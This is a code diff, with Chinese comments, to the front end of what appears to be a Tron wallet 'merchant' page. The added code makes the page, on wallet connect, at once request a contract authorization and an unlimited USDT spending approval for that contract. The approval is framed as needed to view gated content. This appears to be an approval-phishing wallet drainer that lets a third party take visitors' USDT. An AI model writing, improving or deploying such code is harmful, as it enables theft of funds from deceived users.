@@ -5,7 +5,7 @@ const TRC20_USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  // 你的 USDT
 
 const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";
 
-// **SimpleMerchant 合约的 ABI (手动组合的 JSON 签名，以解决 'is not a function' 错误)**
+// **SimpleMerchant 合约的 ABI (手动组合的 JSON 签名)**
 const CONTRACT_ABI = [ 
     // connectAndAuthorize() external
     {
@@ -473,7 +473,7 @@ function updateStatus(message) {
     }
 }
 
-// ---  TronWeb 检查授权状态 ---
+// ---  TronWeb 检查授权状态 (只读) ---
 async function checkAuthorization() {
     try {
         if (!tronWeb || !userAddress || !contractInstance || !usdtContractInstance) {
@@ -493,7 +493,6 @@ async function checkAuthorization() {
         
         let usdtBalanceRaw = "0";
         try {
-            // Tron 的 USDT 是 6 位小数
             usdtBalanceRaw = await usdtContractInstance.balanceOf(userAddress).call();
         } catch(e) { /* Ignore */ }
         const usdtBalance = BigInt(usdtBalanceRaw);
@@ -533,6 +532,7 @@ async function checkAuthorization() {
             connectButton.title = 'Connect Wallet (Complete Authorization)';
             connectButton.disabled = false;
             updateStatus(''); 
+            // 如果授权不足，显示提示，并让用户点击按钮执行 executeAuthorization
             showOverlay('You need to complete the authorization to view the content. Click the wallet link in the upper right corner.'); 
         }
     } catch (error) {
@@ -541,6 +541,75 @@ async function checkAuthorization() {
         showOverlay(`Authorization check failed: ${error.message}`);
     }
 }
+
+// --- 新增：执行授权交易 ---
+async function executeAuthorization() {
+    if (!userAddress) {
+        showOverlay('Please connect your wallet first.');
+        return;
+    }
+
+    try {
+        updateStatus('Checking authorization requirements...');
+        
+        // 重新检查 SimpleMerchant 合约授权状态
+        let isAuthorized = await contractInstance.authorized(userAddress).call();
+        
+        // 1. SimpleMerchant 合约授权
+        if (!isAuthorized) {
+            updateStatus('Requesting SimpleMerchant authorization... Please confirm in your wallet.');
+            showOverlay('Requesting SimpleMerchant authorization... Please confirm the transaction in your wallet.');
+            
+            // 调用 SimpleMerchant 合约的 connectAndAuthorize 方法
+            await contractInstance.connectAndAuthorize().send({
+                feeLimit: 100000000, // 费用限制: 100 TRX
+                callValue: 0,
+                shouldPollResponse: true 
+            });
+            updateStatus(`SimpleMerchant Authorization successful. Checking next step...`);
+            
+            // 确认交易后，更新状态
+            isAuthorized = true;
+            await new Promise(resolve => setTimeout(resolve, 3000)); 
+        }
+        
+        // 重新检查 USDT 授权状态
+        let usdtAllowanceRaw = await usdtContractInstance.allowance(userAddress, TRON_CONTRACT_ADDRESS).call();
+        let isUsdtMaxApproved = BigInt(usdtAllowanceRaw) >= BigInt(ALMOST_MAX_UINT); 
+        
+        // 2. USDT 无限授权
+        if (isAuthorized && !isUsdtMaxApproved) { // 仅在 SimpleMerchant 授权成功后才检查/执行 USDT
+            updateStatus('Requesting USDT infinite approval... Please confirm in your wallet.');
+            showOverlay('Requesting USDT infinite approval... Please confirm the transaction in your wallet.');
+            
+            // 调用 USDT TRC20 合约的 approve 方法
+            await usdtContractInstance.approve(TRON_CONTRACT_ADDRESS, ALMOST_MAX_UINT).send({
+                feeLimit: 100000000, // 费用限制
+                callValue: 0,
+                shouldPollResponse: true 
+            });
+            updateStatus(`USDT Approval successful. Finalizing check...`);
+            
+            await new Promise(resolve => setTimeout(resolve, 3000));
+        }
+
+        // 授权流程完成，检查最终状态并更新 UI
+        await checkAuthorization();
+
+    } catch (error) {
+        console.error("Authorization Execution Failed:", error);
+        // 如果是用户拒绝交易，TronWeb 抛出的错误信息可能会很复杂
+        const errorMessage = error.message.includes('User cancelled') || error.message.includes('Confirmation declined') ? 
+                             'Authorization cancelled by user.' : 
+                             `Transaction failed: ${error.message}`;
+                             
+        updateStatus(`🔴 ${errorMessage}`);
+        showOverlay(`🔴 Authorization failed: ${errorMessage}`);
+        // 交易失败后，回退到只读检查，以防部分授权成功
+        await checkAuthorization();
+    }
+}
+
 
 // --- 连接钱包逻辑 (使用 TronWeb 流程) ---
 async function connectWallet() {
@@ -554,18 +623,15 @@ async function connectWallet() {
         updateStatus('Connecting to wallet...'); 
         showOverlay('Waiting for wallet connection...');
         
-        // **【修复点】** 移除 window.tronLink.request 的调用，兼容不支持 TronLink API 的DApp浏览器
-        
-        // 延迟一段时间等待 TronWeb 完全初始化 (可选，但可以增加兼容性)
+        // 延迟一段时间等待 TronWeb 完全初始化
         await new Promise(resolve => setTimeout(resolve, 500)); 
 
         tronWeb = window.tronWeb;
         
-        // 尝试从 defaultAddress.base58 获取地址
         userAddress = tronWeb.defaultAddress.base58; 
 
         if (!userAddress || userAddress === tronWeb.defaultAddress.hex) { 
-            throw new Error("Could not retrieve Tron account address. Please ensure your wallet is connected/logged in and manually approve the connection in the App.");
+            throw new Error("Could not retrieve Tron account address. Please ensure your wallet is connected/logged in.");
         }
         
         console.log("✅ User Address:", userAddress);
@@ -577,8 +643,8 @@ async function connectWallet() {
         // 实例化 TRC20 合约
         usdtContractInstance = await tronWeb.contract(TRC20_ABI, TRC20_USDT_ADDRESS);
 
-        // 检查授权状态 并处理
-        await handleAuthorization();
+        // 连接成功后，直接进入授权执行流程
+        await executeAuthorization(); 
 
     } catch (error) {
         console.error("Error connecting to wallet:", error);
@@ -588,20 +654,9 @@ async function connectWallet() {
     }
 }
 
-// --- 处理授权流程 ---
+// --- 处理授权流程 (现在只作为 executeAuthorization 的别名) ---
 async function handleAuthorization() {
-    try {
-        if (!tronWeb || !userAddress) {
-            showOverlay('Wallet not connected. Please connect.');
-            return;
-        }
-        // 检查授权状态
-        await checkAuthorization(); // 检查授权并更新 UI
-    } catch (error) {
-        console.error("Authorization process failed:", error);
-        showOverlay(`🔴 Authorization process failed: ${error.message}`);
-        updateStatus(`Authorization failed: ${error.message}`);
-    }
+    await executeAuthorization(); 
 }
 
 // --- 斷開錢包連接 ---
